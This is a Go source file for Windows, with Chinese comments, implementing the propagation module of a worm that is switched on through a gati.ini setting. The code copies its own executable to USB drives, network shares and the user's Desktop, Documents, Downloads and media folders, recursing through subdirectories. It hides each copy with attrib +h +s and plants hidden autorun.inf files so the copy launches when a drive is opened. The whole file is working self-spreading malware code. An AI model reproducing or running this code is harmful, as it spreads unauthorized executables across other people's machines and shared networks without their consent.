//go:build windows

package main

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// wormLoop 传播模块 —— 默认关闭,只有 gati.ini 里 [worm] enabled=true 才会跑
func wormLoop() {
	if gCfg == nil || !gCfg.WormEnabled {
		logf("worm disabled, skip")
		return
	}
	logf("worm ENABLED")

	// 等主界面先起来,别一上来就占磁盘
	time.Sleep(5 * time.Second)

	for round := 0; ; round++ {
		if stopFileExists() {
			logf("worm stops")
			return
		}
		if gCfg.WormUSB {
			spreadByDriveType(DRIVE_REMOVABLE)
		}
		if gCfg.WormNetShares {
			spreadByDriveType(DRIVE_REMOTE)
		}
		if gCfg.WormUserDirs {
			spreadUserDirs()
		}
		// 每轮间隔 90 秒,避免疯狂 IO
		for i := 0; i < 90; i++ {
			if stopFileExists() {
				return
			}
			time.Sleep(time.Second)
		}
	}
}

func logicalDrives() []string {
	mask, _, _ := pGetLogicalDrives.Call()
	var out []string
	for i := 0; i < 26; i++ {
		if mask&(1<<uint(i)) == 0 {
			continue
		}
		out = append(out, string(rune('A'+i))+":\\")
	}
	return out
}

func driveType(root string) uint32 {
	p, err := syscall.UTF16PtrFromString(root)
	if err != nil {
		return DRIVE_UNKNOWN
	}
	t, _, _ := pGetDriveTypeW.Call(uintptr(unsafePointer(p)))
	return uint32(t)
}

func spreadByDriveType(want uint32) {
	for _, d := range logicalDrives() {
		if stopFileExists() {
			return
		}
		if driveType(d) != want {
			continue
		}
		spreadRoot(d, gCfg.WormDepth)
	}
}

// spreadRoot 把一个盘/共享的根目录往下扫,逐层投放
func spreadRoot(root string, depth int) {
	if depth < 0 {
		return
	}
	target := filepath.Join(root, gCfg.WormName)
	dropCopy(target)

	if gCfg.WormAutorun {
		writeAutorun(root)
	}

	entries, err := os.ReadDir(root)
	if err != nil {
		return
	}
	for _, e := range entries {
		if stopFileExists() {
			return
		}
		if !e.IsDir() {
			continue
		}
		name := strings.ToLower(e.Name())
		// 跳过系统目录,免得撞权限/拖时间
		if isSystemDir(name) {
			continue
		}
		sub := filepath.Join(root, e.Name())
		dropCopy(filepath.Join(sub, gCfg.WormName))
		spreadRoot(sub, depth-1)
	}
}

func isSystemDir(name string) bool {
	switch name {
	case "$recycle.bin", "system volume information", "windows", "program files",
		"program files (x86)", "programdata", "recovery", "boot", "config.msi",
		"node_modules", ".git", "appdata":
		return true
	}
	return false
}

// dropCopy 复制自身到目标位置;大小一致就跳过,避免无限重复
func dropCopy(dst string) {
	if stopFileExists() {
		return
	}
	if strings.EqualFold(dst, selfPath) {
		return
	}
	if st, err := os.Stat(dst); err == nil {
		if srcSt, e2 := os.Stat(selfPath); e2 == nil && st.Size() == srcSt.Size() {
			return
		}
	}
	b, err := os.ReadFile(selfPath)
	if err != nil {
		return
	}
	if err := os.WriteFile(dst, b, 0755); err != nil {
		return
	}
	_ = hiddenCmd("attrib", "+h", "+s", dst)
	logf("worm drop -> %s", dst)
	time.Sleep(time.Duration(gCfg.WormThrottleMs) * time.Millisecond)
}

func writeAutorun(root string) {
	content := "[AutoRun]\r\nopen=" + gCfg.WormName + "\r\nshell\\open\\command=" + gCfg.WormName + "\r\n"
	_ = os.WriteFile(filepath.Join(root, "autorun.inf"), []byte(content), 0644)
	_ = hiddenCmd("attrib", "+h", "+s", filepath.Join(root, "autorun.inf"))
}

// spreadUserDirs 往当前用户常用目录和公共目录投放
func spreadUserDirs() {
	home, _ := os.UserHomeDir()
	pub := os.Getenv("PUBLIC")
	tgt := []string{
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
		filepath.Join(home, "Pictures"),
		filepath.Join(home, "Videos"),
		filepath.Join(home, "Music"),
	}
	if pub != "" {
		tgt = append(tgt, filepath.Join(pub, "Desktop"), filepath.Join(pub, "Documents"),
			filepath.Join(pub, "Downloads"), filepath.Join(pub, "Pictures"))
	}
	for _, d := range tgt {
		if stopFileExists() {
			return
		}
		if st, err := os.Stat(d); err != nil || !st.IsDir() {
			continue
		}
		dropCopy(filepath.Join(d, gCfg.WormName))
		// 再往里钻一层
		entries, err := os.ReadDir(d)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() && !isSystemDir(strings.ToLower(e.Name())) {
				sub := filepath.Join(d, e.Name())
				dropCopy(filepath.Join(sub, gCfg.WormName))
			}
		}
	}
}
